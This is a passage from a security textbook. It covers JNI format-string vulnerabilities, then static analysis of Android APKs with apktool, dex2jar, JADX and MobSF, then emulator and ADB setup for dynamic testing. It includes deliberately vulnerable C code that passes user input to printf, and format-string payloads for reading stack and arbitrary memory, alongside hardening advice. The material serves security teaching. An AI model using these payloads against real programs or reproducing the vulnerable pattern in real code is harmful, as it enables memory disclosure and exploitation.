JNIEXPORT void JNICALL Java_Game_playGame(JNIEnv *env, jobject obj, jstring javaString) {

_set_printf_count_output(1);

jboolean isCopied;

const char *vulnerableString = (*env)->GetStringUTFChars(env, javaString, &isCopied);

printf(vulnerableString);

printf("\n\n");

printf("Did you win?\n");

printf(isCopied==1?"No\n":"Yes\n");

if (isCopied) {

(*env)->ReleaseStringUTFChars(env, javaString, vulnerableString);

}

return;

}

The function _set_printf_count_output is used on Windows only. Windows disables certain format strings by default as unsafe, and this reenables them so that the code will behave the same on Windows as Mac and Linux. After saving the file, compile the C library using gcc, as shown in the following figure:

![](images/Figure_14.10.png)

Figure 14.10: Compile vulnerable C code

Following is a list of format strings we will want to use when testing for these vulnerabilities and a brief description of how the format function works that should help create payloads:

| Parameter | Output | Passed by |
| %d | Decimal | Value |
| %x | Hexadecimal | Value |
| %c | Character | Value |
| %u | Unsigned decimal | Value |
| %p | Pointer | Reference |
| %s | String | Reference |
| %n | Write the number of characters into a pointer | Reference |

Table 14.1: Format string parameters

The format function uses a format string to control its behavior. It reads the string character by character and copies non-% characters to the output. If the character is a %, the following character specifies the type of parameter to evaluate. Data for the parameters is retrieved from the stack. Now, we can run this code and see what format string inputs change in the program response:

![](images/Figure_14.11.png)

Figure 14.11: Running the vulnerable Java code

Here, we can see the input parameter printed by the game number and the C code printing the interpreted format String. If we try different format strings, we can cause the program a fatal error, as shown in the following figure:

![](images/Figure_14.12.png)

Figure 14.12: Fatal error in format string

When a format string vulnerability is discovered, an attacker can try four different types of attacks, which are as follows:

*   Crash the program. This was demonstrated above as proof of the format string.

*   Read the memory on the stack.

*   Read memory at an arbitrary location.

*   Write to an arbitrary location. This can lead to the same type of exploit as a classic buffer overflow.

We will look at the general way to set up reading the memory on the stack and reading memory from an arbitrary location. For more details on writing to random places, please see [https://cs155.stanford.edu/papers/formatstring-1.2.pdf](https://cs155.stanford.edu/papers/formatstring-1.2.pdf).

The format function output provides valuable information about the process layout and helps us identify offsets for the exploitation or reconstruction of stack frames. Using a format string like %08x.%08x.%08x.%08x displays parts of the stack memory and allows us to retrieve parameters as hexadecimal numbers. This technique provides crucial information about program flow and may help identify the correct offsets for successful exploitation. An example of this is shown in the following figure:

![](images/Figure_14.13.png)

Figure 14.13: Reading memory on the stack

Viewing memory locations beyond the stack memory using the format function is possible. The challenge is finding a way to display memory from an address we can control. The %s parameter can display memory from a stack-supplied address. Modifying the stack pointer can supply our address to the %s parameter. We use dummy parameters to increase the stack pointer until it points to our memory space. We can then display memory from an arbitrary address by appending %s to our string. If you are interested in a memory address 9fbaa310, then the payload to read the memory at the address until the next NULL character would be \x10\xa3\xba\x9f_%08x.%08x.%08x.%08x.%08x|%s|.

The following section will look at some techniques to secure JNI implementations.

[Securing JNI implementations](#contents.xhtml_sc2_235a)

This section will look at various ways to help secure JNI implementations, including design advice, secure coding advice, compile flags, and automated and manual reviews.

Utilize the -Xcheck:jni flag during Java compilation to enable JNI code verification. This flag helps identify potential issues and ensures compliance with JNI conventions, enhancing the overall robustness of the native code integration.

In C compilation, employ the -Wformat -Werror=format-security flags to enable compilation warnings for functions like printf that could introduce format string vulnerabilities. These warnings are proactive indicators to address potential security risks associated with improper format string usage:

*   Refrain from using unsafe C functions like gets and memcpy and opt for safer alternatives such as fgets and memmove that incorporate bounds checking. Exercise caution with functions like strcpy and strcat to prevent buffer overflows and enhance the overall security posture.

*   Evaluate the necessity of JNI usage and, when possible, consider a complete Java implementation. JNI introduces potential security complexities, and minimizing its usage reduces the attack surface and enhances the application's overall security.

*   Implement static code analysis tools to scan the JNI code for potential vulnerabilities. These tools help identify security issues, memory leaks, and other critical flaws early in development, allowing for timely remediation.
*   Ensure developers are well-versed in common C security issues and educate them on best practices for JNI security. Conduct thorough code reviews, focusing on potential vulnerabilities, and establish a collaborative environment to address security concerns effectively.

By incorporating these security measures into JNI development workflows, developers can significantly reduce the risk of security vulnerabilities and enhance the overall integrity of Java applications by leveraging native code integration.

[Conclusion](#contents.xhtml_sc2_236a)

In this chapter, we explored JNI vulnerabilities and associated risks, exploitation techniques, and secure coding practices. The understanding gained extends to JNI and encompasses broader aspects of memory corruption within Java. With insights into recognizing, exploiting, and safeguarding against these vulnerabilities, readers can navigate where Java and native code intersect. As we advocate for secure coding practices, the knowledge gained in this chapter is a valuable resource for fortifying Java applications against potential threats arising from JNI and related memory manipulation concerns.

In the upcoming chapters, we will learn about Android applications written in Java. Many of the techniques already discussed, including this chapter on JNI are applicable to Android applications. In the next chapter, we will discuss static analysis in Android applications.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 15Static Analysis of Java Android Applications](#contents.xhtml_ch15a)

[Introduction](#contents.xhtml_sc2_237a)

Understanding the intricacies of Android applications becomes paramount for developers and security practitioners in mobile application development. This chapter explores the static analysis of Android applications, specifically those coded in Java. Generally, static analysis refers to what you can find by examining an application without running it. This can be done manually or with the aid of tools, but notably, we will not run the application at all or observe any network traffic in this chapter. We will navigate through essential Android basics, unravel tools crucial for decompiling APK files into Java code, and explore using MobSF to conduct static analysis. Through step-by-step guides and practical examples, we aim to equip you with the skills to unveil secrets and vulnerabilities within Android application source code. In this chapter, you will comprehensively understand Android app files, terminology, and the methodologies employed in static analysis.

[Structure](#contents.xhtml_sc2_238a)

This chapter will discuss the static analysis of Android applications written in Java and will look at:

*   Android basics
*   Reversing APK files
*   Static analysis basics

There will be step-by-step guides on decompiling and several examples to understand how to find secrets and vulnerable components.

[Objectives](#contents.xhtml_sc2_239a)

By the end of this chapter, you will have a basic understanding of the Android application files and terminology. You will know various techniques for decompiling back to Java code. You will know how to manually find secrets and vulnerabilities in the source code and resources. You will also learn how to use MobSF to automate some of this source code analysis.

[Example applications](#contents.xhtml_sc2_240a)

Download the sample application now to walk through the Android examples. We will use one Android application: the HabitHelper App. The HabitHelper App is publicly available for download. The HabitHelper application is a vulnerable mobile application written as part of a conference project and released publicly several years ago. It is a mobile version of the habit-helper web application we were looking at earlier. The habit-helper mobile application can be downloaded at [https://github.com/securitymagick/JavaPentestingExamples](https://github.com/securitymagick/JavaPentestingExamples).

Another testing application that can be used for further practcie is GoatDroid is an Open Worldwide Application Security Project (OWASP) project designed to show Android application testing. GoatDroid can be downloaded at [https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk](https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk).

[Android basics](#contents.xhtml_sc2_241a)

Both Android development and Android penetration testing require a solid understanding of fundamental concepts that lay the groundwork for robust applications. This section will briefly cover some of the fundamentals of Android applications, the terminology necessary for this, and the other Android-related chapters. If you already understand Android, skip the section and refer back as needed.

From the Android Manifest that orchestrates the app's configuration to the dynamic communication facilitated by Intents, the interactive components known as Activities, and the seamless integration of web content through WebViews—each element plays a pivotal role. We will discuss Deeplinks, Broadcast Reciever and how Services manage background processes. As we unravel these Android basics, we also shed light on the crucial concept of permissions, ensuring your app interacts securely with the device and other applications.

[AndroidManifest.XML](#contents.xhtml_sc3_242a)

The Android Manifest is an Extensible Markup Language (XML) file in Android development that serves as an Android application’s fundamental configuration and information hub. It outlines essential details such as the app's package name, version, declared components (activities, services, broadcast receivers), required permissions, hardware, software features compatibility, and the app's entry points. This manifest file provides the Android operating system with crucial metadata about the application, enabling proper installation, execution, and interaction with other components on the device.

The manifest file is also a wonderful starting point for a penetration tester. For more information on the AndroidManifest.XML file, refer:

[https://developer.android.com/guide/topics/manifest/manifest-intro](https://developer.android.com/guide/topics/manifest/manifest-intro).

[Intents](#contents.xhtml_sc3_243a)

Intents are how Android applications communicate between different components or applications. It is a fundamental part of the Android operating system's inter-component communication system. Intents are used to request actions, such as starting an activity or service or broadcasting a message. They can also carry extra data along with the request, allowing for the exchange of information between components. Intents facilitate dynamic and loosely coupled interactions, enabling various parts of an Android or different applications to collaborate seamlessly. Intents can be implicit or explicit. Explicit intents define the exact class expected to receive it, whereas any application can pick up implicit intents.

For more information on intents, see:

[https://developer.android.com/reference/android/content/Intent](https://developer.android.com/reference/android/content/Intent).

[Activities](#contents.xhtml_sc3_244a)

An activity represents a single user interface screen or window within an application. It serves as the entry point for user interaction and typically corresponds to a visual interface with which users can see and interact.

Each activity is defined in the AndroidManifest.xml file, specifying its behavior, layout, and how it interacts with other components. Activities can display information, receive user input, and launch other activities or services. The transition between different activities is often assisted by using Intents, allowing for seamless navigation and interaction within the application.

For more information on activities, refer to:

[https://developer.android.com/reference/android/app/Activity.html](https://developer.android.com/reference/android/app/Activity.html).

[Deep links](#contents.xhtml_sc3_245a)

Deep links refer to URLs designed to navigate users directly to specific content or screens within a mobile application rather than just launching the app's main entry point. They work by having the URL trigger an Intent to start the application at a specific point and send extra information if specified. They enhance the user experience by allowing a seamless transition from a web link, notification, or other external source directly to the relevant content within the app.

Deep links also open a new attack surface for the malicious user. As the link can be hijacked by another application that defines this scheme, the user can be tricked into using the wrong application to open it.

For more information on deep links, see [https://developer.android.com/training/app-links/deep-linking](https://developer.android.com/training/app-links/deep-linking).

[Permissions](#contents.xhtml_sc3_246a)

Permissions are safeguards that control access to sensitive resources or functionalities on a device. Android applications must declare the permissions they need in their AndroidManifest.xml file, specifying the actions or data they intend to access. These permissions serve as a security mechanism, ensuring that apps have explicit user consent before accessing certain features or information. Permissions can either be normal or dangerous. Standard permissions are automatically granted to the app at installation and typically involve access to less sensitive resources. Dangerous permissions involve access to sensitive user data or device capabilities. Users must explicitly grant these permissions, which can be revoked through the device settings.

Examples of Android permissions include access to the device's camera, location, contacts, storage, and more. By explicitly declaring and requesting permissions, Android apps adhere to the principle of least privilege, ensuring they only access the resources necessary for their intended functionality and enhancing user privacy and security.

For more information on permissions, see:

[https://developer.android.com/guide/topics/manifest/permission-element.html](https://developer.android.com/guide/topics/manifest/permission-element.html).

[Broadcast Receiver](#contents.xhtml_sc3_247a)

A Broadcast Receiver enables the application to respond to system-wide broadcast announcements or to broadcast messages sent by other applications. It acts as an event listener, allowing an application to react to various events or changes in the device's environment. A Broadcast Receiver must be registered in the manifest file or dynamically within the application code to specify the broadcasts it should listen to. They are associated with specific types of broadcasts through intent filters, which define the conditions under which the receiver should be triggered. Broadcast Receivers work asynchronously, allowing them to respond to broadcast messages independently of the main application thread.

Common use cases for Broadcast Receivers include responding to system events (such as device boot or connectivity changes), intercepting custom broadcasts sent by other components or applications, and triggering actions in response to changes in the device environment.

For more information on broadcast receivers, see:

[https://developer.android.com/reference/android/content/BroadcastReceiver.html](https://developer.android.com/reference/android/content/BroadcastReceiver.html).

[Services](#contents.xhtml_sc3_248a)

A Service performs background tasks or long-running operations independently of the user interface. Services enable applications to execute operations that continue to run even if the user interface is not actively in the foreground or if the user switches to another application. Services run in the background and are not directly tied to the user interface, allowing them to perform tasks that do not require user interaction. Unlike activities, services do not have a user interface. They operate behind the scenes to handle network operations, file I/O, or other time-consuming operations. Services have lifecycle methods similar to activities, including methods like onCreate(), onStartCommand(), and onDestroy(). These methods define the service's behavior during different stages of its lifecycle. Services can communicate with other components, such as activities or broadcast receivers, using mechanisms like Intents, Android Interface Definition Language (AIDL), or bound services.

Common use cases for services include playing music in the background, handling network requests, performing periodic tasks, or running tasks that require continued execution even when the app is not actively used.

For more information on services, see:

[https://developer.android.com/guide/components/services.html](https://developer.android.com/guide/components/services.html).

[WebViews](#contents.xhtml_sc3_249a)

A WebView allows developers to embed a web browser within their application to display web content. It supplies a way to render HTML content, load web pages, and execute JavaScript code directly within an Android app, enabling the integration of web-based functionality. WebViews facilitate the rendering of web pages or HTML content, allowing the display of dynamic and interactive web-based information within the app. WebViews support executing JavaScript code, enabling the interactive features commonly found in web applications. Developers can customize the appearance and behavior of WebViews, including handling user interactions, managing cookies, and providing a seamless integration of web content with the native app. WebViews allow users to interact with web forms, click on links, and navigate through web pages directly within the app.

WebViews are commonly used in Android applications when web content needs to be displayed without launching a separate web browser. This is particularly useful for scenarios like embedding web-based help systems, displaying online documentation, or integrating web-based authentication flows within the app.

The WebView can be the WebView class, which is meant for simple HTML viewing, or the WebChromeClient, a full-fledged web browser. So, all the web application vulnerabilities discussed earlier in the book should be checked for when web views are in play.

For more information on WebViews, refer to the following:

[https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView) and

[https://developer.android.com/reference/android/webkit/WebChromeClient](https://developer.android.com/reference/android/webkit/WebChromeClient).

[Reversing APK files](#contents.xhtml_sc2_250a)

An APK file is a compiled and packaged Android application. The APK file is a zip, so you can rename it to a zip and open it with any zip file to see the compiled file resources. Below is the app-dvhh.apk file – this is one of the HabitHelper mobile applications that was renamed and opened, showing its files and file structure:

![](images/Figure_15.1.png)

Figure 15.1: Opening apk file as zip

The APK file contains the Android Manifest XML file and the binary dex classes file, which is the compiled source code, and the resources. The resources include the arsc file, which is the resource table listing all resources with needed information for easy retrieval via ID, the folders res, and META-INF. The res folder contains resources the application uses and generally includes any configuration for 3rd party components. The META-INF folder will contain metadata for the application's specific components and Java libraries.

These are all binary files, so other tools are required to extract a human-readable version.

Reversing the APK file is a simple three-step process. This section will walk through reversing the HabitHelper Android application. The same steps can be used for any application.

[APKTOOL](#contents.xhtml_sc3_251a)

The first step uses apktool, which will decode the AndroidManifest.xml into a human-readable form and extract the dex and resource files. If you are using a Kali Linux instance, then apktool will be included in the default installed tools. Apktool is a jar that can be installed on any operating system with Java. The latest apktool version is 2.8.1 and can be downloaded off bitbucket at:

[https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.8.1.jar](https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.8.1.jar)

The usage is simple:

Java -jar apktool_2.8.1.jar d example.apk

The d is the decode option, which will recreate the AndroidManifest.xml and put the layouts, images, and other resource files into their original form. The output will be stored in a new directory named after the .apk file. That directory will be created in the current directory unless the -o option is used to specify an output directory.

Running the command, the HabitHelper APK file returns the following output:

![](images/Figure_15.2.png)

Figure 15.2: Apktool example

The AndroidManifest and the resources have been decoded. Unless you specify an output file, Apktool will create a directory called the name of the APK file. In this case, the file is named app-dev. This contains the decoded resources as follows:

![](images/Figure_15.3.png)

Figure 15.3: Decoded resources with ApkTool

The apktool.yml file created by apktool contains basic stats and lists of files. The original folder includes the original (IE not decoded) version of the Android Manifest and the META-INF files. The res folder is the decoded resources. The smali folder contains the code decompiled into the smali language. The AndroidManifest is viewable as follows:

![](images/Figure_15.4.png)

Figure 15.4: Decoded Android Manifest

The source code is not Java yet, but the decoded Android Manifest and resources will be used extensively to find sources for insecure interactions with applications. This will be covered in the Static analysis basics section of this chapter.

[DEX2JAR](#contents.xhtml_sc3_252a)

The second step of reversing the Android application is to use dex2jar to create a jar containing the Java source code. The latest versions can be found at:

[https://github.com/pxb1988/dex2jar/releases](https://github.com/pxb1988/dex2jar/releases)

At the time of writing this, the latest version is 2.1\. After downloading the latest zip file, extract it. Several wrapper scripts will be revealed. Use the .sh scripts on Mac or Linux and the .bat scripts on Windows. You can run the command on either the classes.dex file or on the apk file itself:

d2j-dex2jar.bat ../example.apk -o myOutput.jar

d2j-dex2jar.bat ../example.apk/classes.dex -o myOutput.jar

We will run this code directly on the APK file from the HabitHelper mobile application. The output will look like the following:

![](images/Figure_15.5.png)

Figure 15.5: Create a jar with dex2jar

If we look in the specified directory, the jar file is there. Refer to the following figure:

![](images/Figure_15.6.png)

Figure 15.6: Jar file generated by Dex2jar

A jar file is the compiled Java code, so all we have to do now is decompile that jar file.

[JD-GUI](#contents.xhtml_sc4_253a)

JD-GUI is the Graphical User Interface (GUI) form of Java Decompiler (JD) that is available for free. You can download and find more information at [https://java-decompiler.github.io/](https://java-decompiler.github.io/). There are many other possible Java decompilers that you can use instead. Each decompiler works a little bit differently. Sometimes, JD-GUI cannot recover all the source code, but another decompiler may. Let us decompile the HabitHelper mobile application’s code that we just generated. Follow the given steps:

1.  Start the application, select the File menu in the upper left, and choose Open File from the submenu as follows:

    ![](images/Figure_15.7.png)

    Figure 15.7: JD-GUI Open Jar File

2.  Browse to the jar file and click Okay. You will be given a tree to browse through with perfectly readable Java Code in a few seconds. Refer to the following figure:

    ![](images/Figure_15.8.png)

    Figure 15.8: Habit Helper code decompiled

We will look at how to use this in the Static analysis basics section.

[JADX-GUI](#contents.xhtml_sc4_254a)

Jadx-gui is another tool that can reverse Apk files. It combines these steps and makes the reversing process simple. Do not forget Apktool and Dex2Jar, as they can both play a role in exploiting mobile applications via patching, as seen in [Chapter 16](#ch16.xhtml), Dynamic Analysis of Java Android Applications. You can download JADX-GUI from GitHub, which is located at [https://github.com/skylot/jadx](https://github.com/skylot/jadx).

Starting JADX-GUI will give you the option to open either a file or a project, as follows:

![](images/Figure_15.9.png)

Figure 15.9: JADX-GUI start page

Click the Open file button and select the HabitHelper APK. In about a minute, the file will decode all the resources and decompile the code into Java, and you will see a tree such as the one shown in the following figure:

![](images/Figure_15.10.png)

Figure 15.10: JADX-GUI decompiling an apk file

[Static analysis basics](#contents.xhtml_sc2_255a)

Static analysis is crucial in discovering vulnerabilities and ensuring robust code integrity. This section explores static analysis through a dual lens, blending the thorough insights of manual review with the efficiency of automated scanning using Mobile Security Framework (MobSF). Static analysis involves the in-depth examination of an application's source code and resources without execution, supplying a comprehensive understanding of potential security risks. Combining the precision of manual scrutiny with the scalability of automated tools like MobSF, we navigate the intricacies of Android app security to fortify against potential threats.

[Manual analysis](#contents.xhtml_sc3_256a)

Manual static code analysis is a critical side of Android application security. It involves meticulously examining the source code to find potential vulnerabilities and show a robust defense against security threats. To start this process, finding dangerous sources by creating a comprehensive threat model for the application is good practice. This model aids in delineating trust boundaries and understanding the potential impact of security breaches.

For Android applications, an essential aspect of manual analysis involves listing insufficiently protected exported components, such as activities, services, or broadcast receivers. Tracking Intents and Extras throughout the app is essential, as these elements often serve as familiar sources of untrusted input. The AndroidManifest.xml file can be used to define the application's behavior, including the definition of Intents and Extras accepted as input and specifying the behavior of WebViews, file storage, and components exposed to potential attacks. These definitions are fundamental in showing trust boundaries and fortifying the app's security posture. A quick threat model can be drawn up using only the AndroidManifest.xml.

Intents and Extras are commonly used for inter-component communication, which poses a risk when accepting untrusted input. Untrusted input in an Android application includes all user input as well as any input from another application. When an application sends data to another application, this is generally done through content providers, which need to be declared in the AndroidManifest file. Content Resolvers are in an interface for Content Providers and are responsible for CRUD operations on incoming URIs. These can be a source of vulnerabilities, especially when handling content URIs with the content:// scheme. The source code should be examined for any code related to these content providers, as they can reveal misconfiguration, SQL injection, and path traversal vulnerabilities.

Additionally, active content rendered in WebViews, particularly JavaScript, can introduce vulnerabilities if loaded from third-party or untrusted sources. As WebViews are displaying a webpage in the Android application, the testing within the WewbView is extremely similar to testing a web application.

During the manual review, employing search techniques becomes indispensable. Using tools like strings and grep or searching through jadx-gui functionality helps find potentially sensitive information. General search terms like secret, password, token, key, api, and other apparent choices can reveal critical points of interest. Furthermore, vigilance in scrutinizing activities is paramount, ensuring they do not grant unauthorized access to user data without proper authentication. While meaningful examples of such vulnerabilities are rare and often require physical access to an unlocked device, manual static code analysis cannot be overstated in securing Android applications against potential threats.

Use the search terms to find possible vulnerable components in the HabitHelper application and resources. To search in JADX-GUI, click the magnifying glass and enter the search term in pop as follows:

![](images/Figure_15.11.png)

Figure 15.11: JADX-GUI term search

The term secret seems to pull up some interesting information. There is a secret menu activity and checkSecret function that both seem interesting. Looking at the details of the check secret function, we see the following code:

![](images/Figure_15.12.png)

Figure 15.12: checkSecret function

This function checks if your username is Bob and, if so, opens a secret menu activity; we should verify this during the dynamic testing phase.

[Manual analysis with MobSF](#contents.xhtml_sc4_257a)

The Mobile Security Framework is an open-source, free tool that provides static and dynamic analysis for Android and iOS applications. The tool is available at [https://github.com/MobSF/Mobile-Security-Framework-MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF). You can run MobSF as a docker image, on your Kali VM, or as part of your CI/CD pipeline.

The easiest way to run is using the Docker image. To use the Docker image, run the following commands:

docker pull open security/mobile-security-framework-mobsf:latest

docker run -it --rm -p 8000:8000 open security/mobile-security-framework-mobsf:latest

To run on a Linux system like Kali, change to the directory you have downloaded the framework to and first run the setup.sh and run the run.sh, as follows:

$ cd ~/Mobile-Security-Framework-MobSF/

$ ./setup.sh

$ ./run.sh

There are similar bat files for use on Windows. After starting MobSF, you can reach it by browsing to 127.0.0.1:8000. When you do, you will see a screen as shown in [Figure 15.13](#ch15.xhtml_fig15-13):

![](images/Figure_15.13.png)

Figure 15.13: MobSF start screen

We will check out the habit-helper mobile application with this tool. Click the Upload button, analyze it, and select the app-dvhh.apk file. It will start analyzing the apk. This will take several minutes. Refer to the following figure:

![](images/Figure_15.14.png)

Figure 15.14: MobSF base page

You can click on the activities, services, receivers, or providers for more information. The following figure is from clicking on View activities:

![](images/Figure_15.15.png)

Figure 15.15: Activity list from MobSF

Scrolling down also gives us options to save the AndroidManifest.xml and / or source code as follows:

![](images/Figure_15.16.png)

Figure 15.16: MobSF option for file viewing and downloads

There is also information about code scanning and certificate scanning, as follows:

![](images/Figure_15.17.png)

Figure 15.17: MobSF code analysis

The code analysis is good at pointing out places to look at manually, but by no means will all of them be true positives. All of these findings should be manually verified to prevent false positives.

Reversely, there can be findings that are missing, which is why manual analysis is so important.

[Conclusion](#contents.xhtml_sc2_258a)

In concluding our exploration of static analysis for Java Android applications, we have discussed the foundational elements of Android development, dissected tools for decompiling APK files, and harnessed the power of MobSF for automated static analysis. We understood the fundamental grasp of Android application files and terminology, a repertoire of techniques for manual vulnerability discovery, and insights into leveraging MobSF for efficiency. Acknowledging that mobile application security stands distinct from its web counterpart is essential. Unlike web applications, mobile apps heavily rely on APIs and Inter-Process Communication (IPC) to interact with the operating system. Data storage on devices introduces unique challenges, and the susceptibility to reverse engineering underscores the need for robust security practices tailored to the mobile environment. As you venture further into securing Android applications, remember that adapting web-centric techniques may offer insights but needs a nuanced approach to address mobile app development's specific intricacies and challenges.

In the next chapter, we will be providing a comprehensive guide on how to navigate dynamic analysis in Android applications. This will include setting up emulated devices for testing, discussing the fundamentals of the Android Debug Bridge (ADB), and focusing on the OWASP Mobile Top 10 to better understand common threats and dynamic testing. We will also discuss using automated tools like MobSF and Frida for more efficient analysis.

# [CHAPTER 16Dynamic Analysis of Java Android Applications](#contents.xhtml_ch16a)

[Introduction](#contents.xhtml_sc2_259a)

In this chapter, we will explore the tools and techniques essential for mobile security. This chapter is a comprehensive guide to navigating dynamic analysis in Android applications. The tools and techniques explored here aid in uncovering vulnerabilities that may compromise the security of mobile applications. This includes everything from setting up emulated devices for testing to discussing the fundamentals of the Android Debug Bridge (ADB), a command line tool that is included with Android Studio that allows interaction with an emulator or tethered device. A particular focus on the Open Worldwide Application Security Project (OWASP) Mobile Top 10 enriches understanding of common threats, supplying a solid foundation for dynamic testing. With this knowledge, you can manually exploit vulnerabilities and use automated tools like MobSF and Frida to make your analysis more efficient.

[Structure](#contents.xhtml_sc2_260a)

This chapter will discuss the dynamic analysis of Android applications written in Java and will discuss:

*   Setting up an Android emulator
*   Android Debug Bridge basic usage
*   OWASP Mobile Top 10
*   Dynamic analysis

There will be guides and helpful hints for setting up your emulator and a step-by-step walkthrough of exploiting a vulnerable application manually.

[Objectives](#contents.xhtml_sc2_261a)

By the end of this chapter, you will have set up your Android Emulator for active testing. You will know the basics about the Android Debug Bridge and how to use it. You will learn the OWASP Mobile top 10 to help give your testing more direction. You will know how to exploit these vulnerabilities on applications running on your emulator manually. You will also learn how to use MobSF and Frida to automate some of the dynamic analysis.

[Setting up an Android emulator](#contents.xhtml_sc2_262a)

To test a mobile application, you need a test device or emulator. For security testing, you need root access and access to that device via tools like the ADB. You can use a rooted phone for security testing and access debug tools via a USB tether. Rooting a device can be tricky and void warranties, and many companies do not want rooted devices on their networks. Also, it is much harder to change Android versions for testing. Most security testers use emulated Android devices.

Emulators can be set up on any operating system using Android Studio. Android Studio is the official integrated development environment (IDE) for Android app development. Offering a comprehensive suite of tools, it helps the entire development lifecycle, from designing and coding to testing and deployment, supplying a centralized platform for building robust Android applications. The first step is to install your operating system's latest version of Android Studio. The downloads can be found at:

[https://developer.android.com/studio](https://developer.android.com/studio).

After downloading the latest install, run it to get started. The installation can take 30 minutes or longer to complete. You will also need to install Android Emulator and the versions of Android you want to run. Android emulators are virtual devices that mimic the functionalities of real Android devices, enabling developers to test and debug applications without needing physical hardware. These emulators replicate various device configurations, allowing developers to simulate diverse scenarios and ensure the compatibility and performance of their apps across different devices. Lastly, you will also need to install Intel’s Hardware Accelerated Execution Manager (HAXM). HAXM is a hardware-assisted virtualization solution designed to enhance the performance of Android emulators. By leveraging hardware capabilities, HAXM accelerates the execution of virtualized Android environments on Intel-based systems, significantly improving the speed and responsiveness of emulated devices during app testing and development.

After installing Android Studio, you can verify which tools and Android versions are installed and add other tools. You can install these from the Settings menu under the File tab. Refer to the following figure:

![](images/Figure_16.1.png)

Figure 16.1: Settings menu

Then, from the Settings menu, select Android SDK. The tab SDK Tools can be used to verify the emulator is installed and HAXM, which is shown as follows:

![](images/Figure_16.2.png)

Figure 16.2: SDK tools installation

To install a missing tool, check it, then click the Apply button.

Choose the SDK Platform tab to check or install a version of Android. It is a good idea to have several versions of Android for testing. For security testing, it is best to look at the Manifest to see the allowed Android versions for the application. The minimum version is often a good first choice, as older Android versions have fewer security constraints on the system and can make some attacks possible or easier than in a later version. This menu is shown in the following figure:

![](images/Figure_16.3.png)

Figure 16.3: SDK platforms

After installing everything we need, you can start an Android Emulator or create one from the Device Manager. To start an existing emulator, click the Play button next to it. To create a new device, click the Create device button shown in the following figure:

![](images/Figure_16.4.png)

Figure 16.4: Device Manager

After clicking Create Device, the Virtual Device Configuration window will appear. This window allows you to select the type of device and the base hardware, as shown in [Figure 16.5](#ch16.xhtml_fig16-5). Be aware that particular hardware requires specific versions of Android:

![](images/Figure_16.5.png)

Figure 16.5: Creating hardware profile for emulator

After clicking Next, you will be given a chance to select the Android version. This screen also allows us to download a new Android version, as shown in the following figure:

![](images/Figure_16.6.png)

Figure 16.6: Select the Android version

The next screen allows you to name your emulator and select a few other options, as shown in [Figure 16.7](#ch16.xhtml_fig16-7). Generally, the default settings will work well for testing:

![](images/Figure_16.7.png)

Figure 16.7: Finish configuring your emulator

After clicking the Finish button, your new emulator will appear in the device manager, and you can start it. The emulator may take a few minutes to start up. You will see the emulator on and working after the start is complete, as shown in the following figure:

![](images/Figure_16.8.png)

Figure 16.8: Android emulator starting up

[Android Debug Bridge basic usage](#contents.xhtml_sc2_263a)

The ADB is a versatile command-line tool that facilitates communication between a computer and an Android device or emulator. It enables developers to execute various commands, such as installing and debugging applications, transferring files, and accessing a device's shell, supplying essential functionalities for Android app development and testing.

The location of the ADB Command is different on Windows and Linux/OSX. On Windows PCs, ADB can be started from a command prompt like this: C:\Users\<USERNAME>\AppData\Local\Android\sdk\platform-tools\adb.exe.

On Linux or OSX, ADB can be started from a Terminal like this:

/Users/<USERNAME>/Library/Android/sdk/platform-tools/adb. You must replace the <USERNAME> with your own.

Here is a list of common commands for reference. Many of these commands will be shown in this chapter and [Chapter 17](#ch17.xhtml):  Network Analysis of Java Android Applications.

*   adb devices: Lists all the physical devices or emulators adb can connect to.
*   adb shell: Starts the interactive shell.
*   (adb shell) pm list packages: Shows all installed apks.
*   (adb shell) pm path: Returns the path to the app's files.
*   (adb shell) am start: Starts an activity ( hit Enter to see options).
*   (adb shell) am startservice: Starts a service.
*   (adb shell) am broadcast: Sends a broadcast.
*   (adb shell) input [text|keyevent]: Sends keystrokes to the device.
*   adb push: Copies a file from the device to your machine.
*   adb pull: Copies a file from your machine to the device.
*   adb install: Pushes and installs an application to the device.
*   adb uninstall: Uninstalls an application from the device.
*   exit: Terminates the persistent shell.

Use the root command before other commands that require it for root privileges.

*   adb root.
*   adb shell: This will give you a shell with root permissions.

Now, we will look at a few simple examples of using ADB.

First, we run the devices command. Refer to the following figure:

![](images/Figure_16.9.png)

Figure 16.9: ADB devices command

This lists all emulators and tethered devices that adb can communicate with. If there is more than one device in the list, the device ID listed will be needed in later commands to identify which emulator should be used.

Now, let us install the habit helper apk onto our emulator. We can do this using the adb install command as follows:

![](images/Figure_16.10.png)

Figure 16.10: ADB install command

We can then check on our emulator and find the icon to start the habit helper mobile application. This is shown in the following figure:

![](images/Figure_16.11.png)

Figure 16.11: Habit Helper application installed

We can also check what is installed using the package manager (pm) list packages command, as follows:

![](images/Figure_16.12.png)

Figure 16.12: ADB listing packages

This can be helpful to check for other vulnerable applications.

The following subsection will continue to examine adb usage as we review the OWASP Mobile Top 10 and look at examples of how these may be tested.

[OWASP Mobile Top 10](#contents.xhtml_sc2_264a)

The OWASP Mobile Top 10 lists the most critical security risks for mobile applications. It is curated by the OWASP community and is used by developers, security professionals, and enthusiasts to navigate the constantly evolving mobile security threats. The list covers everything from insecure data storage to vulnerabilities in network communication, supplying a comprehensive roadmap to fortify mobile applications against cyber security challenges.

[Improper credential usage](#contents.xhtml_sc3_265a)

Improper credential use encompasses a range of vulnerabilities, from hard-coded passwords to insecure credential transmission, storage, and weak user authentication. Hard-coded passwords, a common pitfall, present a conspicuous security risk, as malicious actors can quickly uncover them, supplying a gateway for unauthorized users. Insecure credential transmission exposes sensitive data to interception, while insecure storage compromises the integrity of user credentials on the device. Additionally, weak user authentication protocols amplify the vulnerability, creating a fertile ground for exploitation.

After logging into the mobile application with the known Lizzie credentials, we can see if there are any local device storage issues. We will start a root shell. Then, look at the shared preferences for this application, making special note of any credential storage. The shared preferences for a package are located at /data/data/<package>/shared_prefs. Refer to the following figure:

![](images/Figure_16.13.png)

Figure 16.13: Shared preferences for Habit Helper mobile app

